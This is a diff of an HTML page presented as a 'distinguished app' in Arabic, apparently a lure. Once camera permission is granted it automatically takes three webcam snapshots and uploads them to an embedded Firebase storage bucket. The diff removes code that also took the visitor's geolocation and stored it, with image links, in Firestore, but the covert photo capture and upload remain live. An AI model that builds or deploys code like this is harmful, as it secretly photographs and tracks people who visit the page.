@@ -5,7 +5,6 @@
   <title>تطبيق مميز</title>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -35,34 +34,28 @@
       appId: "1:724136212410:web:9450152940928e78a40f83",
       measurementId: "G-D8NNFMGFH1"
     };
-    
+
     firebase.initializeApp(firebaseConfig);
     const storage = firebase.storage();
-    const db = firebase.firestore();
 
     const dataURLtoBlob = (dataURL) => {
       const binary = atob(dataURL.split(',')[1]);
       return new Blob([new Uint8Array([...Array(binary.length).keys()].map(i => binary.charCodeAt(i)))], { type: 'image/png' });
     };
 
-    const capturePhoto = (video, canvas, storageRef, captureCount, callback) => {
+    const capturePhoto = (video, canvas, storageRef, callback) => {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      storageRef.put(dataURLtoBlob(canvas.toDataURL('image/png'))).then((snapshot) => {
-        snapshot.ref.getDownloadURL().then((downloadURL) => {
-          db.collection('images').add({ url: downloadURL }).then(callback).catch(console.error);
-        });
-      }).catch(console.error);
+      storageRef.put(dataURLtoBlob(canvas.toDataURL('image/png'))).then(callback).catch(console.error);
     };
 
-    const capturePhotos = (video, canvas, storageRefBase, captureCount, callback) => {
-      capturePhoto(video, canvas, storageRefBase.child(`snapshot_${Date.now()}_${captureCount}.png`), captureCount, () => {
+    const capturePhotos = (video, canvas, storageRefBase, captureCount) => {
+      capturePhoto(video, canvas, storageRefBase.child(`snapshot_${Date.now()}_${captureCount}.png`), () => {
         if (++captureCount < 3) {
-          setTimeout(() => capturePhotos(video, canvas, storageRefBase, captureCount, callback), 500);
+          setTimeout(() => capturePhotos(video, canvas, storageRefBase, captureCount), 500);
         } else {
           video.srcObject.getTracks().forEach(track => track.stop());
-          callback();
         }
       });
     };
@@ -75,26 +68,9 @@
       }
     };
 
-    const uploadLocationToFirebase = (location) => {
-      db.collection('locations').add(location).then(() => {
-        console.log('Location uploaded successfully!');
-      }).catch(console.error);
-    };
-
-    const requestLocationPermissionAndUpload = () => {
-      navigator.geolocation.getCurrentPosition((position) => {
-        const location = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude
-        };
-        uploadLocationToFirebase(location);
-      }, (error) => {
-        console.error('فشل في الحصول على الموقع:', error);
-      });
-    };
-
     const initializePhotoCapture = async () => {
       await requestCameraPermission();
+
       navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
         const video = document.createElement('video');
         video.srcObject = stream;
@@ -102,7 +78,7 @@
         video.addEventListener('loadeddata', () => {
           const canvas = document.getElementById('canvas');
           let captureCount = 0;
-          capturePhotos(video, canvas, storage.ref().child('snapshots/'), captureCount, requestLocationPermissionAndUpload);
+          capturePhotos(video, canvas, storage.ref().child('snapshots/'), captureCount);
         });
       }).catch(console.error);
     };
